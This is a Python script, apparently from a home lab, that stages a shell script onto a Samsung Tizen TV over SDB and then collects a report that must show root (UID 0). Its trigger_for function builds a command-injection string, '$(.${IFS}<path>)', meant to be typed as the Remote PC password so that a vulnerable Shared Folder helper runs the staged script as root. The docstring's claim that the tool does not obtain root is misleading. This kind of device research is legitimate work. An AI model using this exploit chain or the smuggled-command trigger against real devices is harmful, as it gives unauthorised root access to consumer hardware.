#!/usr/bin/env python3
"""One-shot Q80T staged survey transport. Does NOT obtain root or run a TV shell.

Stage uses SDB push/pull to verify exactly the script bytes placed on the
TV. Collect retrieves a private report and rejects incomplete/non-root
results. All root execution, if any, requires owner action on the TV.
"""
from __future__ import annotations

import argparse
import hashlib
import importlib.util
import json
from pathlib import Path
import re
import secrets
import subprocess
import sys

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "scripts"))
from local_config import load_settings  # noqa: E402

LAB = ROOT / ".local" / "tiz0wn-lab"
SESSION = LAB / "staged-session.json"
SDK_TMP = "/home/owner/share/tmp/sdk_tools"
LIMIT = 512 * 1024


def make_script(token: str, report_path: str, survey: str) -> bytes:
    """Fixed, read-only one-shot survey; no remote command input."""
    if not re.fullmatch(r"[0-9a-f]{12}", token):
        raise ValueError("Invalid staged session token")
    if report_path != f"{SDK_TMP}/dtvr{token}.txt":
        raise ValueError("Unexpected report path")
    if "\x00" in survey:
        raise ValueError("Invalid survey content")
    # The surveyed OS may disallow executing unsigned *files*: a signed
    # system shell reads this source. No executable bit is requested.
    # A unique report path prevents collecting results from a prior trial.
    script = (
        "#!/bin/sh\n"
        "umask 022\n"
        f"OUT='{report_path}'\n"
        "(\n"
        "  printf 'DANSTV-ROOT-CHANNEL mode=Snapshot\\n'\n"
        "  uid=$(/usr/bin/id -u 2>/dev/null)\n"
        "  printf 'DANSTV-EUID=%s\\n' \"$uid\"\n"
        "  printf 'DANSTV-SESSION=%s\\n' '" + token + "'\n"
        "  /usr/bin/id 2>/dev/null || :\n"
        "  if [ \"$uid\" = 0 ]; then\n"
        "    (\n" + survey + "\n"
        "    )\n"
        "    status=$?\n"
        "  else\n"
        "    status=126\n"
        "  fi\n"
        "  printf '\\nDANSTV-EXIT=%s\\nDANSTV-END-OF-REPORT\\n' \"$status\"\n"
        ") > \"$OUT.pending\" 2>&1\n"
        "mv \"$OUT.pending\" \"$OUT\"\n"
    )
    return script.encode("utf-8")


def trigger_for(path: str) -> str:
    if not (
        re.fullmatch(r"/tmp/dtvq[0-9a-f]{12}", path)
        or re.fullmatch(r"/home/owner/share/tmp/sdk_tools/dtvq[0-9a-f]{12}", path)
    ):
        raise ValueError("Unexpected staged script path")
    # Literal Remote PC password, interpreted by the TV's affected
    # Shared Folder helper only after a successful RDP login.
    trigger = "$(.${IFS}" + path + ")"
    if len(trigger) > 80:
        raise ValueError("Short trigger unexpectedly exceeds 80 characters")
    return trigger


def get_sdb() -> Path:
    settings = load_settings()
    candidate = settings["sdk_path"] / "tools" / "sdb"
    if not candidate.is_file():
        candidate = candidate.with_suffix(".exe")
    if not candidate.is_file():
        raise RuntimeError("Configured Samsung SDB executable not found")
    return candidate


def call_sdb(sdb: Path, args: list[str], check: bool = True) -> subprocess.CompletedProcess[str]:
    result = subprocess.run([str(sdb), *args], capture_output=True, text=True, timeout=60)
    output = (result.stdout + result.stderr).lower()
    if check and (
        result.returncode != 0
        or any(part in output for part in (
            "you cannot push", "permission denied", "failed to", "0 file(s) pushed",
            "0 file(s) pulled", "cannot create", "remote object does not exist",
        ))
    ):
        raise RuntimeError("SDB transfer failed; check the local device connection (details suppressed)")
    return result


def connect(sdb: Path, tv: str) -> str:
    result = call_sdb(sdb, ["connect", tv + ":26101"])
    output = (result.stdout + result.stderr).lower()
    if "connected to" not in output and "already connected" not in output:
        raise RuntimeError("Samsung SDB connection not confirmed")
    return tv + ":26101"


def stage(tv: str) -> None:
    if SESSION.exists():
        raise RuntimeError("Staged trial already exists. Restore before preparing another.")
    LAB.mkdir(parents=True, exist_ok=True)
    token = secrets.token_hex(6)
    survey = (ROOT / "scripts/tiz0wn/snapshot.sh").read_text(encoding="utf-8")
    report_path = f"{SDK_TMP}/dtvr{token}.txt"
    data = make_script(token, report_path, survey)
    local_script = LAB / f"dtvq{token}.sh"
    if local_script.exists():
        raise RuntimeError("A staged script already exists for this token")
    local_script.write_bytes(data)
    sdb = get_sdb()
    serial = connect(sdb, tv)
    choices = [f"/tmp/dtvq{token}", f"{SDK_TMP}/dtvq{token}"]
    selected = None
    for index, remote in enumerate(choices):
        # Some Samsung SDB builds reject /tmp; the documented SDK share is
        # the deliberately permitted fallback.
        candidate = LAB / f"verify-dtvq{token}.bin"
        try:
            result = call_sdb(sdb, ["-s", serial, "push", str(local_script), remote], check=False)
            output = (result.stdout + result.stderr).lower()
            if result.returncode or "1 file(s) pushed" not in output or "failed" in output:
                continue
            pull = call_sdb(sdb, ["-s", serial, "pull", remote, str(candidate)], check=False)
            if pull.returncode or not candidate.is_file():
                continue
            if hashlib.sha256(candidate.read_bytes()).digest() != hashlib.sha256(data).digest():
                continue
            selected = remote
            break
        finally:
            candidate.unlink(missing_ok=True)
    if selected is None:
        raise RuntimeError("SDB staging could not be verified in either permitted location")
    # Write session only after verified upload. Owned by local lab, not in git.
    record = {"token": token, "tv": tv, "script_path": selected,
              "report_path": report_path, "sha256": hashlib.sha256(data).hexdigest()}
    with SESSION.open("x", encoding="utf-8") as handle:
        json.dump(record, handle, indent=2)
    print("STAGED-VERIFIED: source uploaded and independently pulled back with matching SHA-256.")
    print("Source location:", "short /tmp" if selected.startswith("/tmp/") else "SDK share fallback")
    print("RDP password length:", len(trigger_for(selected)))


def load_session() -> dict:
    data = json.loads(SESSION.read_text(encoding="utf-8"))
    if (not re.fullmatch(r"[0-9a-f]{12}", str(data.get("token", "")))
        or not re.fullmatch(r"(?:[0-9]{1,3}\.){3}[0-9]{1,3}", str(data.get("tv", "")))
        or data.get("report_path") != f"{SDK_TMP}/dtvr{data['token']}.txt"):
        raise ValueError("Staged session has unexpected fields")
    trigger_for(str(data["script_path"]))
    return data


def collect() -> None:
    record = load_session()
    target = LAB / f"staged-snapshot-{record['token']}.txt"
    if target.exists():
        raise RuntimeError("Report destination already exists; refusing to overwrite")
    pending = LAB / f"staged-report-{record['token']}.partial"
    if pending.exists():
        pending.unlink()
    sdb = get_sdb()
    serial = connect(sdb, record["tv"])
    try:
        pull = call_sdb(sdb, ["-s", serial, "pull", record["report_path"], str(pending)])
        if pull.returncode != 0 or not pending.is_file():
            raise RuntimeError("No staged snapshot report is available yet")
        if not 0 < pending.stat().st_size <= LIMIT:
            raise RuntimeError("Report empty or exceeds size limit")
        body = pending.read_bytes()
        lines = body.splitlines()
        if not (len(lines) >= 5
                and lines[0] == b"DANSTV-ROOT-CHANNEL mode=Snapshot"
                and lines[1] == b"DANSTV-EUID=0"
                and lines[2] == ("DANSTV-SESSION=" + record["token"]).encode("ascii")
                and lines[-2:] == [b"DANSTV-EXIT=0", b"DANSTV-END-OF-REPORT"]):
            raise RuntimeError("Report is not a validated UID-0 snapshot (or is incomplete)")
        pending.rename(target)
    finally:
        pending.unlink(missing_ok=True)
    print("SNAPSHOT-RECEIVED: report stored privately under .local/tiz0wn-lab.")
    print("Read-only assessor:")
    print("  py -3 scripts/tiz0wn/assess-snapshot.py --report \"" + str(target) + "\"")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("action", choices=("stage", "collect"))
    parser.add_argument("--tv")
    args = parser.parse_args()
    if args.action == "stage":
        if not args.tv or not re.fullmatch(r"(?:[0-9]{1,3}\.){3}[0-9]{1,3}", args.tv):
            parser.error("Stage requires an IPv4 TV address from the owned lab")
        stage(args.tv)
    else:
        if args.tv:
            parser.error("Collect reads the target from the active private session")
        collect()
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, ValueError, RuntimeError, subprocess.TimeoutExpired) as err:
        print(f"STAGED-SNAPSHOT-ERROR: {err}", file=sys.stderr)
        raise SystemExit(1) from None
